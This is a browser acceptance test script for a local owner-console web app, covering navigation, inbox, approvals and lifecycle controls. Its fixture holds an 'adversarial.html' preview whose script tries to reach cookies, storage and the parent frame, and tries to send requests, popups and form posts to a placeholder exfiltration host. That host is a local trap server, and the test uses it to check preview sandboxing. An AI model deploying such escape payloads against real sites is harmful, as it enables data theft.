#!/usr/bin/env -S uv run --with playwright
"""Real-browser acceptance for the synthetic owner console fixture.

Run from the repository root with ``uv run --with playwright tools/acceptance/console_browser.py``.
The fixture uses a disposable SQLite firm, a local file tree, and no provider or VM.
"""

from __future__ import annotations

import argparse
import http.server
import json
import os
import re
import socket
import tempfile
import threading
import time
from pathlib import Path
from urllib.parse import parse_qs, urlsplit

import uvicorn
from firm_runtime.compatibility import initialize_firm
from firm_runtime.console import build_console_app
from firm_runtime.runtime import Runtime
from firm_runtime.store import OWNER, Store
from firm_runtime.workspaces import sandbox_role_id
from firm_sandbox import Config, Layout, Organization
from firm_sandbox.file_server import FileServer, local_runner


class SyntheticControl:
    def __init__(self, runtime: Runtime):
        self.runtime = runtime
        self.calls: list[str] = []

    def stop(self, force: bool = False):
        self.calls.append("force-stop" if force else "stop")
        status = self.runtime.stop(force)
        if status["active"] and not force:
            return status
        with self.runtime.store.transaction() as db:
            db.execute("UPDATE execution_host SET infrastructure_state='stopped' WHERE singleton=1")
        return self.runtime.stop(force)

    def request_start(self):
        self.calls.append("resume")
        with self.runtime.store.transaction() as db:
            db.execute("UPDATE execution_host SET infrastructure_state='running' WHERE singleton=1")
        self.runtime.start()

    def request_close(self):
        self.calls.append("close")


class SyntheticDecision:
    name = "browser_acceptance"

    def __init__(self, runtime: Runtime):
        self.runtime = runtime

    def grant(self, row: dict):
        with self.runtime.store.transaction() as db:
            self.runtime.requests.pending(db, row["request_id"])
            return {
                "answered": self.runtime.requests.answer(db, [row], "granted", decided_by="owner")
            }

    def deny(self, row: dict, reason: str):
        with self.runtime.store.transaction() as db:
            self.runtime.requests.pending(db, row["request_id"])
            return {
                "answered": self.runtime.requests.answer(
                    db, [row], "denied", reason, decided_by="owner"
                )
            }


def _free_port() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def _start_server(app, port: int):
    server = uvicorn.Server(
        uvicorn.Config(app, host="127.0.0.1", port=port, log_level="error", lifespan="off")
    )
    thread = threading.Thread(target=server.run, daemon=True)
    thread.start()
    deadline = time.monotonic() + 10
    while not server.started and time.monotonic() < deadline:
        time.sleep(0.02)
    if not server.started:
        raise RuntimeError("console server did not start")
    return server, thread


class _TrapHandler(http.server.BaseHTTPRequestHandler):
    hits: list[str] = []

    def do_GET(self):
        type(self).hits.append(f"GET {self.path}")
        body = (
            b"document.body.dataset.externalScriptRan='yes';"
            if self.path == "/external-script"
            else b"trap"
        )
        self.send_response(200)
        self.send_header(
            "Content-Type",
            "application/javascript" if self.path.endswith("script") else "text/plain",
        )
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        type(self).hits.append(f"POST {self.path}")
        self.send_response(204)
        self.end_headers()

    def log_message(self, format, *args):
        return


def _start_trap(port: int):
    _TrapHandler.hits.clear()
    server = http.server.ThreadingHTTPServer(("127.0.0.1", port), _TrapHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server, thread


def _synthetic_firm(root: Path, allowed_host: str, exfil_url: str):
    durable = root / "durable"
    durable.mkdir(parents=True)
    initialize_firm(root)
    runtime = Runtime(Store(durable / "firm.sqlite3"))
    founder = runtime.lifecycle.initialize(
        "browser-acceptance",
        "Synthetic browser acceptance fixture.",
        {
            "max_active": 2,
            "staffing": False,
            "founder_profile": "default",
            "profiles": {"default": {}},
        },
    )["founder"]["employee_id"]
    analyst = runtime.lifecycle.hire(
        founder,
        "analyst",
        "Synthetic analyst for UI acceptance.",
        "default",
        request_id="browser-hire-analyst",
    )["employee_id"]
    with runtime.store.transaction() as db:
        db.execute(
            "INSERT INTO execution_host(singleton,sandbox_root,sandbox_firm_id,sandbox_identity,"
            "infrastructure_state) "
            "VALUES(1,?,?,?,'stopped')",
            (str(root / "sandbox"), "browser-acceptance", "synthetic"),
        )
    runtime.requests.kinds["browser_acceptance"] = SyntheticDecision(runtime)
    incident_id = runtime.accounts.pause(OWNER, "profile", "default", "config")["incident_id"]
    with runtime.store.transaction() as db:
        db.execute(
            "UPDATE execution_incidents SET created_at=? WHERE incident_id=?",
            (runtime.store.clock() - 39 * 60, incident_id),
        )
        runtime.messaging.notice(
            db,
            [OWNER],
            "This immutable notice describes the same execution hold.",
            subject="Another notice about the shared hold",
            regarding={"kind": "incident", "id": incident_id},
        )
        runtime.messaging.notice(
            db,
            [analyst],
            "This notice was delivered to a role, not to the owner.",
            subject="Role notice about the shared hold",
            regarding={"kind": "incident", "id": incident_id},
        )
    runtime.messaging.send(
        analyst,
        [OWNER],
        "Read this synthetic owner mail.",
        subject="A question for the owner",
        request_id="browser-owner-mail",
    )
    runtime.messaging.send(
        analyst,
        [OWNER],
        "This synthetic update can be marked done.",
        subject="An update for the owner",
        request_id="browser-owner-update",
    )
    with runtime.store.transaction() as db:
        for index, (purpose, cause) in enumerate(
            (
                ("Grant visible test access", "owner review"),
                ("Deny visible test access", "owner review"),
            )
        ):
            runtime.requests.ask_owner(
                db,
                {"employee_id": analyst, "activation_id": None},
                "browser_acceptance",
                f"synthetic/resource-{index + 1}",
                purpose,
                cause,
            )
    work = "org/founder/analyst/work"
    benign = b"""<!doctype html><meta charset=utf-8><body><p id='result'>waiting</p>
<script>
document.querySelector('#result').textContent = 'inline script executed';
let parentBlocked = false, storageBlocked = false, cookieBlocked = false;
try { parent.document.body.dataset.parentTouched = 'yes'; } catch (_) { parentBlocked = true; }
try { localStorage.setItem('x', 'y'); } catch (_) { storageBlocked = true; }
try { document.cookie = 'preview=1'; void document.cookie; } catch (_) { cookieBlocked = true; }
document.body.dataset.parentBlocked = String(parentBlocked);
document.body.dataset.storageBlocked = String(storageBlocked);
document.body.dataset.cookieBlocked = String(cookieBlocked);
</script></body>"""
    hostile = b"""<!doctype html><meta charset=utf-8><body>
<p id='attack' data-state='loaded'>adversarial preview</p>
<script>
window.attackDone = true;
try { parent.document.body.dataset.parentTouched = 'yes'; } catch (_) {}
try { document.cookie = 'preview=1'; } catch (_) {}
try { localStorage.setItem('preview', '1'); } catch (_) {}
try { fetch('__EXFIL__/fetch-attempt'); } catch (_) {}
try { window.open('__EXFIL__/popup-attempt'); } catch (_) {}
try { top.location = '__EXFIL__/top-attempt'; } catch (_) {}
const form = document.createElement('form'); form.method = 'post';
form.action = '__EXFIL__/form-attempt';
document.body.append(form); form.submit();
</script>
<script src='__EXFIL__/external-script'></script>
<a id='external-anchor' href='__EXFIL__/anchor-attempt' target='_blank'>external link</a>
<a id='self-anchor' href='/self-navigation-target'>self navigation</a></body>"""
    hostile = hostile.replace(b"__EXFIL__", exfil_url.encode("ascii"))
    meta_refresh = b"""<!doctype html><meta charset=utf-8>
<meta http-equiv='refresh' content='1;url=/meta-refresh-target'>
<p id='meta'>meta refresh test</p>"""
    files = {
        f"{work}/inline.html": benign,
        f"{work}/adversarial.html": hostile,
        f"{work}/meta-refresh.html": meta_refresh,
        f"{work}/download.txt": b"synthetic attachment payload\n",
        f"{work}/opportunity-shortlist.md": b"""# Opportunity shortlist report

The shortlist favours service businesses with evidence of owner succession.

## Shortlist

| Opportunity | Why now | Main risk |
| --- | --- | --- |
| Customs brokerage | Licensed brokers retiring | Licence transfer |
| HVAC service firms | Recurring service contracts | Technician supply |
| Equipment dealers | Consolidating networks | Financing cycles |

## Limitations

Public evidence has not been checked against private data.

<script>document.body.dataset.markdownScriptRan = 'yes'</script>
<b id="raw-html">Raw HTML stays text.</b>
""",
    }
    box = type("SyntheticSandbox", (), {})()
    file_root = root / "file-server"
    (file_root / "locks").mkdir(parents=True)
    guest_root = file_root / "guest"
    box.file_server = FileServer(
        Config(file_root, firm_id="test"), local_runner(guest_root)
    )
    ledger = box.file_server._load()
    ledger["port"] = 445
    box.file_server._save(ledger)
    box.file_server.provision(sandbox_role_id(analyst), Organization("founder/analyst"))
    for path, content in files.items():
        (guest_root / path).write_bytes(content)
    control = SyntheticControl(runtime)
    app = build_console_app(runtime, allowed_host=allowed_host, sandbox=box, control=control)
    runtime.messaging.send(
        analyst, [OWNER], "The shortlist is ready to read. Limitations are in the report.",
        subject="Opportunity shortlist report delivered",
        attachments=[
            f"{Layout.for_role(sandbox_role_id(analyst)).drive}/{work}/opportunity-shortlist.md"
        ],
        request_id="browser-report",
    )
    return runtime, analyst, app, control


def main(argv: list[str] | None = None) -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--screenshot", type=Path, help="Save a synthetic console screenshot")
    parser.add_argument(
        "--screenshot-dir", type=Path, help="Save all five destinations at 1440 px and 390 px"
    )
    args = parser.parse_args(argv)
    try:
        from playwright.sync_api import expect, sync_playwright
    except ImportError:
        parser.error(
            "Playwright is required for the browser acceptance; run "
            "`uv run --with playwright tools/acceptance/console_browser.py`."
        )

    with tempfile.TemporaryDirectory(prefix="firm-console-browser-") as temp:
        root = Path(temp) / "firm"
        root.mkdir()
        port = _free_port()
        exfil_port = _free_port()
        base = f"http://127.0.0.1:{port}"
        exfil_url = f"http://127.0.0.1:{exfil_port}"
        runtime, analyst, app, control = _synthetic_firm(root, f"127.0.0.1:{port}", exfil_url)
        trap_server, trap_thread = _start_trap(exfil_port)
        server, thread = _start_server(app, port)
        evidence: dict = {
            "checks": {},
            "external_requests": [],
            "frame_navigations": [],
            "popups": [],
            "console": [],
        }
        try:
            with sync_playwright() as playwright:
                chromium = os.environ.get("FIRM_ACCEPTANCE_CHROMIUM")
                browser = playwright.chromium.launch(
                    headless=True, executable_path=chromium or None
                )
                page = browser.new_page(
                    accept_downloads=True, viewport={"width": 1440, "height": 1000}
                )
                page.on("popup", lambda popup: evidence["popups"].append(popup.url))
                page.on(
                    "console",
                    lambda message: evidence["console"].append(f"{message.type}: {message.text}"),
                )
                page.on(
                    "request",
                    lambda request: (
                        evidence["external_requests"].append(request.url)
                        if not request.url.startswith(base)
                        else None
                    ),
                )
                page.on(
                    "framenavigated",
                    lambda frame: (
                        evidence["frame_navigations"].append(frame.url)
                        if frame != page.main_frame
                        else None
                    ),
                )
                page.goto(f"{base}/unlock/{app.state.console_key}", wait_until="networkidle")

                def screenshot_destination(destination):
                    if not args.screenshot_dir:
                        return
                    args.screenshot_dir.mkdir(parents=True, exist_ok=True)
                    for width in (1440, 390):
                        page.set_viewport_size({"width": width, "height": 1000})
                        page.evaluate("window.scrollTo(0, 0)")
                        assert page.evaluate(
                            "document.documentElement.scrollWidth <= window.innerWidth"
                        ), f"{destination} overflows at {width}px"
                        page.screenshot(
                            path=str(args.screenshot_dir / f"{destination}-{width}.png"),
                            full_page=True,
                        )
                    page.set_viewport_size({"width": 1440, "height": 1000})
                    evidence["checks"][f"{destination}_desktop_and_narrow"] = {"passed": True}

                def navigate(destination):
                    page.locator(f'#destinations a[href="#{destination}"]').click()
                    expect(page.locator(f"#route-{destination}")).to_be_visible()
                    expect(
                        page.locator(f'#destinations a[href="#{destination}"]')
                    ).to_have_attribute("aria-current", "page")

                def assert_in_viewport(locator):
                    # is_visible() also passes for elements thousands of pixels off-screen.
                    assert locator.evaluate(
                        "node => { const r = node.getBoundingClientRect(); "
                        "return r.top >= 0 && r.bottom <= innerHeight "
                        "&& r.left >= 0 && r.right <= innerWidth; }"
                    ), locator.bounding_box()

                def control_action(action):
                    if not page.locator("#firm-menu").evaluate("node => node.open"):
                        page.locator("#firm-menu summary").click()
                    page.locator(f"#{action}-firm").click()
                    expect(page.locator("#control-dialog")).to_be_visible()
                    page.locator("#confirm-control").click()

                def refresh_overview():
                    with page.expect_response(
                        lambda response: "/api/inbox?" in response.url
                    ) as inbox_response:
                        with page.expect_response(
                            lambda response: response.url.endswith("/api/snapshot")
                        ) as snapshot_response:
                            # Dispatch refresh without moving focus from the control under test.
                            page.locator("#refresh").evaluate("node => node.click()")
                    assert snapshot_response.value.status == 200
                    assert inbox_response.value.status == 200
                    page.wait_for_load_state("networkidle")

                expect(page.locator("#route-overview")).to_be_visible()
                expect(page.locator("#mandate-text")).to_contain_text(
                    "Synthetic browser acceptance"
                )
                expect(page.locator("#decision-list")).to_contain_text("synthetic/resource-1")
                expect(page.locator("#owner-mail")).to_contain_text("A question for the owner")
                expect(page.locator("#team-now")).to_contain_text("founder")
                for destination in ("inbox", "results", "team", "system", "overview"):
                    navigate(destination)
                page.go_back()
                expect(page.locator("#route-system")).to_be_visible()
                page.go_forward()
                expect(page.locator("#route-overview")).to_be_visible()
                evidence["checks"]["hash_routes_and_back_button"] = {"passed": True}

                expect(page.locator("#freshness")).to_contain_text("Live · updated")
                expect(page.locator("#status-age")).to_be_hidden()
                expect(page.locator("#decisions-age")).to_be_hidden()
                expect(page.locator("#facts")).to_contain_text("Not accepting work")
                expect(page.locator("#facts")).to_contain_text("Stopped")
                expect(page.locator("#firm-menu summary")).to_have_text(
                    "Firm: not accepting work"
                )
                expect(page.locator("#latest-results")).to_contain_text(
                    "opportunity-shortlist.md"
                )
                expect(page.locator(".incident-card h3").first).to_have_text(
                    "Profile default has a configuration problem"
                )
                for card in page.locator("#decision-list .decision-card").all():
                    identifier = card.get_attribute("data-request-id") or card.get_attribute(
                        "data-incident-id"
                    )
                    assert identifier not in card.inner_text()
                    details = card.locator(".technical-details")
                    details.locator("summary").click()
                    expect(details).to_contain_text(identifier)
                    details.locator("summary").click()
                evidence["checks"]["plain_copy_and_exception_only_freshness"] = {"passed": True}

                page.set_viewport_size({"width": 390, "height": 1000})
                page.evaluate("window.scrollTo(0, document.documentElement.scrollHeight)")
                assert page.evaluate("""() => {
                    const footer = document.querySelector('footer').getBoundingClientRect();
                    const tabs = document.querySelector('#destinations').getBoundingClientRect();
                    return footer.top >= 0 && footer.bottom <= tabs.top
                        && window.scrollY + window.innerHeight >=
                           document.documentElement.scrollHeight - 1;
                }"""), "Footer is obscured by the bottom tabs at maximum scroll"
                page.set_viewport_size({"width": 1440, "height": 1000})
                page.evaluate("window.scrollTo(0, 0)")
                evidence["checks"]["narrow_bottom_scroll_clears_tabs"] = {"passed": True}

                screenshot_destination("overview")

                unavailable = browser.new_page()
                unavailable.route("**/api/inbox?**", lambda route: route.abort())
                unavailable.goto(
                    f"{base}/unlock/{app.state.console_key}", wait_until="networkidle"
                )
                expect(unavailable.locator("#owner-mail")).to_contain_text(
                    "Owner mail unavailable; waiting for a sample."
                )
                unavailable.unroute("**/api/inbox?**")
                expect(unavailable.locator("#owner-mail")).to_contain_text(
                    "A question for the owner", timeout=10000
                )
                unavailable.close()
                evidence["checks"]["first_owner_mail_failure_is_unavailable"] = {"passed": True}

                stalled = browser.new_page()
                snapshots = []
                held_requests = []
                stalled.on(
                    "request",
                    lambda request: snapshots.append(request.url)
                    if request.url.endswith("/api/snapshot") else None,
                )
                stalled.route(
                    "**/api/analysis/network?**", lambda route: held_requests.append(route)
                )
                stalled.goto(f"{base}/unlock/{app.state.console_key}", wait_until="load")
                expect(stalled.locator("#freshness")).to_contain_text("Live · updated")
                expect(stalled.locator("#network-age")).to_contain_text(
                    "Unavailable · no sample received", timeout=12000
                )
                assert len(snapshots) >= 3, snapshots
                expect(stalled.locator("#send-form button[type=submit]")).to_be_enabled()
                stalled.route("**/api/snapshot", lambda route: held_requests.append(route))
                # Ages must advance even when neither source sends a response.
                stalled.wait_for_timeout(3500)
                previous_age = stalled.locator("#freshness").inner_text()
                stalled.wait_for_timeout(1500)
                assert stalled.locator("#freshness").inner_text() != previous_age
                expect(stalled.locator("#banner")).to_be_visible(timeout=12000)
                expect(stalled.locator("#send-form button[type=submit]")).to_be_disabled()
                for held in held_requests:
                    held.abort()
                stalled.unroute("**/api/analysis/network?**")
                stalled.unroute("**/api/snapshot")
                expect(stalled.locator("#banner")).to_be_hidden(timeout=12000)
                expect(stalled.locator("#network-age")).to_have_text("", timeout=12000)
                stalled.close()
                evidence["checks"]["stalled_gets_timeout_without_freezing_polling_or_ages"] = {
                    "passed": True
                }

                page.locator("#firm-menu summary").click()
                page.locator("#resume-firm").click()
                page.locator("#cancel-control").click()
                expect(page.locator("#firm-menu summary")).to_be_focused()
                page.locator("#firm-menu summary").click()
                page.locator("#resume-firm").click()
                page.keyboard.press("Escape")
                expect(page.locator("#firm-menu summary")).to_be_focused()
                evidence["checks"]["lifecycle_cancel_restores_firm_menu_focus"] = {"passed": True}

                page.route("**/api/snapshot", lambda route: route.abort())
                expect(page.locator("#banner")).to_contain_text(
                    "Can't reach the firm", timeout=10000
                )
                # Find controls by their purpose, independently of the implementation tag.
                mutating_controls = page.locator(
                    "#send-form button[type=submit], #firm-menu button, #confirm-control, "
                    "#decision-list .owner-controls button, "
                    "#decision-list .deny-form button[type=submit], "
                    "#decision-list .incident-card button.primary, "
                    "#owner-mail .owner-controls button"
                )
                assert mutating_controls.count() >= 12
                for action in mutating_controls.all():
                    expect(action).to_be_disabled()
                navigate("inbox")
                expect(page.locator("#messages .reply-button").first).to_be_visible()
                for action in page.locator("#messages .reply-button").all():
                    expect(action).to_be_disabled()
                navigate("system")
                expect(page.locator("#banner")).to_be_visible()
                page.unroute("**/api/snapshot")
                expect(page.locator("#banner")).to_be_hidden(timeout=10000)
                navigate("overview")
                evidence["checks"]["disconnected_banner_and_disabled_actions"] = {"passed": True}

                owner_update = page.locator(".mail-item").filter(has_text="An update for the owner")
                with page.expect_response(
                    lambda r: r.url.endswith("/api/messages/dismiss")
                ) as dismissed:
                    owner_update.get_by_role("button", name="Mark done").click()
                assert dismissed.value.status == 200
                expect(owner_update).to_have_count(0)
                owner_question = page.locator(".mail-item").filter(
                    has_text="A question for the owner"
                )
                disclosure = owner_question.locator("details")
                summary = disclosure.locator("summary")
                summary.click()
                summary.focus()
                refresh_overview()
                expect(disclosure).to_have_attribute("open", "")
                expect(summary).to_be_focused()
                expect(disclosure).to_contain_text("Read this synthetic owner mail.")
                evidence["checks"]["mail_disclosure_and_focus_survive_poll"] = {"passed": True}
                owner_question.get_by_role("button", name="Reply", exact=True).click()
                expect(page).to_have_url(f"{base}/#inbox")
                page.wait_for_load_state("networkidle")
                expect(page.locator("#send-body")).to_be_focused()
                assert_in_viewport(page.locator("#send-body"))
                evidence["checks"]["overview_reply_keeps_composer_focus_after_navigation"] = {
                    "passed": True
                }
                page.locator("#send-body").fill("Owner response to the synthetic question")
                page.locator("#send-form button[type=submit]").click()
                expect(page.locator("#send-status")).to_contain_text("Sent")
                navigate("overview")
                expect(page.locator("#owner-mail")).not_to_contain_text("A question for the owner")
                evidence["checks"]["owner_mail_dismiss_and_atomic_reply"] = {"passed": True}

                incident = page.locator("#decision-list .incident-card").filter(has_text="default")
                expect(incident).to_contain_text("Fix the entry for profile default")
                with page.expect_response(
                    lambda r: r.url.endswith("/api/incidents/clear")
                ) as cleared:
                    incident.get_by_role("button", name="Resume work", exact=True).click()
                assert cleared.value.status == 200
                expect(incident).to_have_count(0)
                expect(page.locator("#decision-list")).to_contain_text("Hold cleared at")
                evidence["checks"]["incident_clear_and_recovery"] = {"passed": True}

                navigate("inbox")
                page.locator('#inbox-views button[data-view="all"]').click()
                incident_group = page.locator(".incident-group").filter(
                    has_text="Another notice about the shared hold"
                )
                expect(incident_group).to_have_count(1)
                expect(incident_group.locator(".message-card")).to_have_count(2)
                expect(incident_group.locator(".incident-status")).to_contain_text(
                    re.compile(r"Resolved .* · cleared by you · paused \d+ min")
                )
                expect(incident_group).to_contain_text(
                    "This immutable notice describes the same execution hold."
                )
                expect(
                    incident_group.get_by_role("button", name="Reply", exact=True)
                ).to_have_count(0)
                incident_id = page.evaluate(
                    "async () => (await (await fetch('/api/incidents?recent=50')).json())"
                    ".recent.find(incident => incident.dependency === 'default').incident_id"
                )
                assert incident_id not in incident_group.locator(
                    ".conversation-heading"
                ).inner_text()
                with runtime.store.transaction() as db:
                    db.execute(
                        "UPDATE execution_incidents SET resolved_by=NULL WHERE incident_id=?",
                        (incident_id,),
                    )
                refresh_overview()
                expect(incident_group.locator(".incident-status")).not_to_contain_text("by you")
                expect(incident_group.locator(".incident-status")).to_contain_text("Resolved")
                with runtime.store.transaction() as db:
                    db.execute(
                        "UPDATE execution_incidents SET resolved_by='owner' WHERE incident_id=?",
                        (incident_id,),
                    )
                refresh_overview()
                expect(incident_group.locator(".incident-status")).to_contain_text("cleared by you")
                evidence["checks"]["inbox_incident_group_and_live_resolution_attribution"] = {
                    "passed": True
                }

                runtime.messaging.send(
                    analyst, [OWNER], "An Inbox update to dismiss.",
                    subject="Inbox dismissal probe", request_id="browser-inbox-dismiss",
                )
                runtime.messaging.send(
                    analyst, [OWNER], "An Inbox question for an inline reply.",
                    subject="Inbox reply probe", request_id="browser-inbox-reply",
                )
                page.locator('#inbox-views button[data-view="new"]').click()
                inbox_update = page.locator(".message-card").filter(
                    has_text="Inbox dismissal probe"
                )
                with page.expect_response(
                    lambda r: r.url.endswith("/api/messages/dismiss")
                ) as done:
                    inbox_update.get_by_role("button", name="Mark done", exact=True).click()
                assert done.value.status == 200
                expect(inbox_update).to_have_count(0)
                page.locator('#inbox-views button[data-view="done"]').click()
                expect(inbox_update).to_be_visible()
                expect(inbox_update.get_by_role("button", name="Mark done")).to_have_count(0)
                page.locator('#inbox-views button[data-view="new"]').click()
                inbox_question = page.locator(".message-card").filter(has_text="Inbox reply probe")
                inbox_question.get_by_role("button", name="Reply", exact=True).click()
                expect(inbox_question.locator("#send-form")).to_be_visible()
                page.locator("#send-body").fill("Inline response from the owner")
                page.locator("#send-body").focus()
                refresh_overview()
                expect(page.locator("#send-body")).to_have_value("Inline response from the owner")
                expect(page.locator("#send-body")).to_be_focused()
                with page.expect_response(
                    lambda r: r.url.endswith("/api/messages/reply")
                ) as replied:
                    page.locator("#send-form").get_by_role("button", name="Send reply").click()
                assert replied.value.status == 200
                expect(inbox_question).to_have_count(0)
                page.locator('#inbox-views button[data-view="done"]').click()
                expect(inbox_question).to_be_visible()
                evidence["checks"]["inbox_mark_done_inline_reply_and_views"] = {"passed": True}

                page.locator('#inbox-views button[data-view="all"]').click()
                expect(page.locator("#messages")).not_to_contain_text(
                    "This notice was delivered to a role, not to the owner."
                )
                page.locator("#include-role-mail").check()
                expect(incident_group.locator(".message-card")).to_have_count(3)
                expect(page.locator("#messages")).to_contain_text(
                    "This notice was delivered to a role, not to the owner."
                )
                evidence["checks"]["include_mail_between_roles"] = {"passed": True}
                page.locator("#send-recipients").select_option(analyst)
                page.locator("#send-subject").fill("Browser acceptance conversation")
                page.locator("#send-body").fill("Synthetic first message")
                page.locator("#send-form button[type=submit]").click()
                first = page.locator(".message-card").filter(has_text="Synthetic first message")
                expect(first).to_be_visible()
                reply_button = first.get_by_role("button", name="Reply")
                reply_button.focus()
                # Also reorder the feed while preserving the focused card and refreshing metadata.
                runtime.messaging.send(
                    analyst, [OWNER], "A new message while Reply is focused",
                    request_id="browser-focus-refresh",
                )
                with page.expect_response(lambda r: "/api/messages?" in r.url):
                    page.locator("#refresh").evaluate("node => node.click()")
                expect(page.locator("#messages")).to_contain_text(
                    "A new message while Reply is focused"
                )
                expect(reply_button).to_be_focused()
                evidence["checks"]["inbox_reply_focus_survives_feed_refresh"] = {"passed": True}
                conversation_id = page.evaluate(
                    "async () => (await (await fetch('/api/messages?limit=10')).json())"
                    ".messages.find(message => message.body === 'Synthetic first message')"
                    ".conversation_id"
                )
                first.get_by_role("button", name="Reply").click()
                expect(first.locator("#send-form")).to_be_visible()
                expect(page.locator("#send-status")).not_to_contain_text(conversation_id)
                page.locator("#send-body").fill("Synthetic reply in same conversation")
                page.locator("#send-form button[type=submit]").click()
                expect(page.locator("#messages")).to_contain_text(
                    "Synthetic reply in same conversation"
                )
                messages = page.evaluate(
                    "async () => (await (await fetch('/api/messages?limit=10')).json()).messages"
                )
                conversation_messages = [
                    message
                    for message in messages
                    if message["body"]
                    in ("Synthetic first message", "Synthetic reply in same conversation")
                ]
                assert len(conversation_messages) == 2, conversation_messages
                assert all(m["conversation_id"] == conversation_id for m in conversation_messages)
                evidence["checks"]["send_reply_same_conversation"] = {
                    "passed": True,
                    "conversation": conversation_id,
                }

                # The server records a send, but the browser loses its response. Reload must
                # reconcile the sessionStorage operation key instead of duplicating the send.
                def lose_send_response(route):
                    # Playwright's API fetch omits browser-controlled Fetch Metadata.
                    recorded = route.fetch(
                        headers={
                            **route.request.all_headers(),
                            "origin": base,
                            "sec-fetch-site": "same-origin",
                        }
                    )
                    assert recorded.status == 200, recorded.text()
                    route.abort()

                page.route("**/api/messages/send", lose_send_response)
                page.route("**/api/messages/operation?**", lambda route: route.abort())
                page.locator("#send-recipients").select_option(analyst)
                page.locator("#send-body").fill("Receipt recovery probe")
                page.locator("#send-form button[type=submit]").click()
                expect(page.locator("#send-status")).to_contain_text(
                    "Could not check the saved send"
                )
                assert page.evaluate(
                    "Object.keys(sessionStorage).some(key => key.endsWith('firm-message:send'))"
                )
                page.unroute("**/api/messages/send")
                page.unroute("**/api/messages/operation?**")
                page.reload(wait_until="networkidle")
                expect(page.locator("#send-status")).to_contain_text("already recorded as sent")
                recovered = page.evaluate(
                    "async () => (await (await fetch('/api/messages?limit=100')).json()).messages"
                )
                assert sum(m["body"] == "Receipt recovery probe" for m in recovered) == 1
                evidence["checks"]["composer_receipt_recovery_after_reload"] = {"passed": True}

                navigate("overview")
                expect(page.locator("#decision-list")).to_contain_text("synthetic/resource-1")
                request1 = page.locator(".request-card").filter(has_text="synthetic/resource-1")
                request1.get_by_role("button", name="Approve", exact=True).click()
                expect(page.locator("#notice")).to_contain_text("Approved synthetic/resource-1.")
                expect(page.locator("#decision-list")).not_to_contain_text("synthetic/resource-1")
                expect(page.locator("#decision-list")).to_contain_text("synthetic/resource-2")
                request2 = page.locator(".request-card").filter(has_text="synthetic/resource-2")
                request2.get_by_role("button", name="Decline…", exact=True).click()
                reason = request2.locator(".deny-form textarea")
                expect(reason).to_have_attribute("required", "")
                request2.get_by_role("button", name="Decline request", exact=True).click()
                expect(request2).to_be_visible()
                assert not reason.evaluate("node => node.checkValidity()")
                reason.fill("Synthetic review declined")
                reason.focus()
                refresh_overview()
                expect(reason).to_be_visible()
                expect(reason).to_have_value("Synthetic review declined")
                expect(reason).to_be_focused()
                evidence["checks"]["denial_draft_and_focus_survive_poll"] = {"passed": True}
                request2.get_by_role("button", name="Decline request", exact=True).click()
                expect(page.locator("#notice")).to_contain_text("Declined synthetic/resource-2.")
                expect(page.locator("#decision-list")).not_to_contain_text("synthetic/resource-2")
                evidence["checks"]["grant_and_deny_visible"] = {"passed": True}

                navigate("inbox")
                page.locator('#inbox-views button[data-view="all"]').click()
                decisions = page.locator("#messages .decision-row")
                expect(decisions.filter(has_text="synthetic/resource-1")).to_contain_text("you")
                expect(decisions.filter(has_text="synthetic/resource-2")).to_contain_text("you")
                # Both disclosures start closed; land on the chosen ID, not just System.
                expect(page.locator("#history")).not_to_have_attribute("open", "")
                request_records = page.evaluate(
                    "async () => (await (await fetch('/api/requests')).json()).recent"
                )
                for resource in ("synthetic/resource-1", "synthetic/resource-2"):
                    chosen = next(r for r in request_records if r["resource"] == resource)
                    decision_link = decisions.filter(has_text=resource).get_by_role(
                        "link", name="Decision record"
                    )
                    decision_link.focus()
                    decision_link.press("Enter")
                    record = page.locator(
                        f'#decision-history [data-record-id="{chosen["request_id"]}"]'
                    )
                    expect(record).to_be_focused()
                    expect(record).to_contain_text(resource)
                    assert_in_viewport(record)
                    expect(page.locator("#history")).to_have_attribute("open", "")
                    expect(page.locator("#decision-history").locator("..")).to_have_attribute(
                        "open", ""
                    )
                    page.locator("#decision-history").locator("..").locator(
                        ":scope > summary"
                    ).click()
                    page.locator("#history > summary").click()
                    page.go_back()
                    expect(page.locator("#route-inbox")).to_be_visible()
                evidence["checks"]["decision_record_navigation_reveals_requested_id"] = {
                    "passed": True, "records": 2,
                }
                screenshot_destination("inbox")
                evidence["checks"]["inbox_decision_records"] = {"passed": True}

                navigate("team")
                role = page.locator(".role-card").filter(has_text="founder/analyst")
                disclosure = role.locator(".role-details")
                with page.expect_response(
                    lambda r: f"/api/roles/{analyst}?section=mandate" in r.url
                ) as mandate:
                    disclosure.locator("summary").click()
                assert mandate.value.status == 200
                expect(disclosure.locator(".role-mandate")).to_contain_text(
                    "Synthetic analyst for UI acceptance."
                )
                for fact in ("Model", "Effort", "Level", "Tokens", "Context", "Hold"):
                    expect(disclosure.locator(".role-facts")).to_contain_text(
                        re.compile(fact, re.IGNORECASE)
                    )
                disclosure.locator("summary").focus()
                with page.expect_response(lambda r: r.url.endswith("/api/snapshot")):
                    page.locator("#refresh").evaluate("node => node.click()")
                page.wait_for_load_state("networkidle")
                expect(disclosure).to_have_attribute("open", "")
                expect(disclosure.locator("summary")).to_be_focused()
                screenshot_destination("team")
                evidence["checks"]["team_mandate_and_persistent_role_disclosure"] = {
                    "passed": True
                }

                with page.expect_response(
                    lambda response: response.url.endswith("/api/control/resume")
                ) as resume_response:
                    control_action("resume")
                assert resume_response.value.status == 202, resume_response.value.status
                assert "resume" in control.calls, control.calls
                expect(page.locator("#resume-firm")).to_be_disabled()
                with page.expect_response(
                    lambda response: response.url.endswith("/api/control/stop")
                ) as stop_response:
                    control_action("stop")
                assert stop_response.value.status == 200, stop_response.value.status
                expect(page.locator("#resume-firm")).to_be_enabled()
                assert control.calls == ["resume", "stop"], control.calls
                evidence["checks"]["stopped_resume_control"] = {
                    "passed": True,
                    "resume_and_stop_buttons_exercised": True,
                    "control_calls": control.calls.copy(),
                }
                with page.expect_response(lambda r: r.url.endswith("/api/control/resume")):
                    control_action("resume")
                activation = runtime.admit()
                assert activation is not None
                runtime.mark_started(activation.activation_id)
                with page.expect_response(lambda r: r.url.endswith("/api/control/stop")):
                    control_action("stop")
                expect(page.locator("#lifecycle-state")).to_contain_text(
                    "Firm: stopping after current work"
                )
                assert runtime.status()["state"] == "draining"
